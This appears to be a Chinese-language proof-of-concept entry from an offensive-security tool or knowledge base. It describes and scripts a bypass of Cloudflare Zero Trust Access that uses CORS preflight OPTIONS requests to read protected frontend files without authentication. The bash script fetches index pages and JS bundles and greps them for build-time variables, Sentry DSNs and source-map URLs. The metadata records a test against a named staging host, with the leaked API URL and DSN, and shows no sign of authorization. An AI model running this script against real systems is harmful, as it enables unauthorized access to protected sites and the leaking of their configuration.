# Cloudflare Access CORS preflight 绕过：OPTIONS+Origin+Access-Control-Request-Method 未认证读取受保护静态前端与构建配置（portal-staging 实证）

- **code**: cf-access-cors-preflight-bypass-static-origin
- **kind**: poc
- **category**: unauthorized
- **component**: Cloudflare Zero Trust Access / Heroku router / Vite SPA
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 于 ARTEX 工作机实测 portal-staging.fanatical.com（CF Zero Trust Access）：基线 GET / → HTTP/2 302，location: https://fanatical.cloudflareaccess.com/cdn-cgi/access/login/portal-staging.fanatical.com?kid=513f8e5e...，server: cloudflare；加上 OPTIONS + Origin: https://portal.fanatical.com + Access-Control-Request-Method: GET → HTTP/2 200 / 520B text/html Publisher Portal index（via: 2.0 heroku-router，引用 /assets/index-Ci7OJKgw.js）；同头请求该 bundle → 200 / 936,101B application/javascript，grep 得 VITE_API_URL="https://staging.fanatical.com/api/publisher-portal"、VITE_ENVIRONMENT="staging"、Sentry DSN；二分对照：仅 Origin → 400/155、仅 ACRM → 400/155、GET+双头 → 302/143、OPTIONS+双头 → 200/520，故 200 来自 preflight 放行而非缓存。范围对照：apistaging 同法 origin 返回 403 守卫 JSON，admin 子域 CF 403/151。
- **path**: pocs/cf-access-cors-preflight-bypass-static-origin/cf-access-cors-preflight-bypass.sh
- **tags**: cloudflare-access,cors-preflight,access-bypass,static-assets,heroku,vite,bundle-secrets,build-config-leak,unauthorized
- **created_at**: 2026-11-11T18:33:52.148Z
- **engine**: https://portal-staging.fanatical.com
- **found_by**: recon

## 描述

原理：Cloudflare Zero Trust Access 只对「非 CORS preflight」的浏览器请求做身份校验；当 OPTIONS 同时携带 Origin 与 Access-Control-Request-Method 时视为 CORS 预检直接放行到 origin。若 origin（Heroku/nginx/静态中间件）把 OPTIONS 当普通静态请求处理并回真实文件，就可在未认证状态下读取 Access 保护下的整站前端产物（index.html、JS/CSS bundle）。附加收益：Vite/CRA bundle 里的 VITE_* / REACT_APP_* 构建期变量常含内网 API 域名、环境名、Sentry DSN、有时连带 map 文件与第三方 key。适用面仅限静态文件面；API 子域通常被 origin 自身守卫拦住。

## 用法

```
前置：目标 GET 返回 302 到 &lt;team&gt;.cloudflareaccess.com（确认在 CF Access 后）。把 T 换成目标域名、O 换成任一被接受的 Origin（先用目标主站自身域名最稳）。
1) 基线确认被拦：curl -sk -D - -o /dev/null "$T/"
2) 绕过取 index：curl -sk -X OPTIONS -H "Origin: $O" -H 'Access-Control-Request-Method: GET' "$T/"
3) 从 index 取 /assets/*.js，同样头再请求，得完整 bundle
4) 判据：200 + content-length 等于真实文件大小 + 响应头出现 origin 特征（如 via: 2.0 heroku-router）+ body 是对应文件内容
5) 必做二分：OPTIONS 只带 Origin、只带 ACRM 均应 400/155；GET 带双头应仍 302 —— 证明 200 不是缓存/CDN
失败常见原因：origin 对 OPTIONS 走框架路由返回 204/405 或 403 JSON（API 面）；CF 侧对 preflight 也 403/151；Origin 不在 allowlist；命中 CDN 缓存（加 ?cb=$RANDOM 复核）。
```

## 正文

```
# Cloudflare Access CORS preflight 绕过 —— 未认证读取受保护静态前端
# 用法: T=<https://目标域> O=<被接受的 Origin> bash cf-access-cors-preflight-bypass.sh
# 前提: 目标在 Cloudflare Zero Trust Access 之后(GET 302 到 <team>.cloudflareaccess.com)
#       且 origin 对 OPTIONS 返回真实文件(静态中间件/Heroku router 常见)
set -u
T="${T:?set T=https://target}"
O="${O:-$T}"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36'
PRE=(-X OPTIONS -H "Origin: $O" -H 'Access-Control-Request-Method: GET' -H 'Cache-Control: no-cache')

echo '== 1) 基线: 应被 Access 拦截 =='
curl -sk -A "$UA" -D - -o /dev/null "$T/" | sed -n '1,12p'    # 期望 302 + location: https://<team>.cloudflareaccess.com/...

echo '== 2) preflight 绕过取 index =='
curl -sk -A "$UA" "${PRE[@]}" -D idx.hdr -o idx.html "$T/"
sed -n '1,12p' idx.hdr
wc -c idx.html
grep -oE '/assets/[A-Za-z0-9_.-]+\.(js|css)' idx.html | sort -u

echo '== 3) 取 bundle 并提取构建期配置 =='
for p in $(grep -oE '/assets/[A-Za-z0-9_.-]+\.js' idx.html | sort -u); do
  n=$(basename "$p")
  curl -sk -A "$UA" "${PRE[@]}" -o "$n" "$T$p"
  echo "[$p] $(wc -c < "$n") bytes"
  grep -oaE '(VITE|REACT_APP|NEXT_PUBLIC)_[A-Z0-9_]+:"[^"]*"' "$n" | sort -u
  grep -oaE 'https://[A-Za-z0-9.-]+\.ingest[A-Za-z0-9.-]*sentry\.io/[0-9]+' "$n" | sort -u
  grep -oaE 'sourceMappingURL=[^[:space:]"]+' "$n" | sort -u
done

echo '== 4) 二分对照(必做, 排除缓存) =='
u="$T/?cb=$RANDOM"
printf 'OPTIONS+Origin only        -> %s\n' "$(curl -sk -A "$UA" -o /dev/null -w '%{http_code}/%{size_download}' -X OPTIONS -H "Origin: $O" "$u")"
printf 'OPTIONS+ACRM only          -> %s\n' "$(curl -sk -A "$UA" -o /dev/null -w '%{http_code}/%{size_download}' -X OPTIONS -H 'Access-Control-Request-Method: GET' "$u")"
printf 'OPTIONS+Origin+ACRM        -> %s\n' "$(curl -sk -A "$UA" -o /dev/null -w '%{http_code}/%{size_download}' "${PRE[@]}" "$u")"
printf 'GET+Origin+ACRM            -> %s\n' "$(curl -sk -A "$UA" -o /dev/null -w '%{http_code}/%{size_download}' -H "Origin: $O" -H 'Access-Control-Request-Method: GET' "$u")"
```
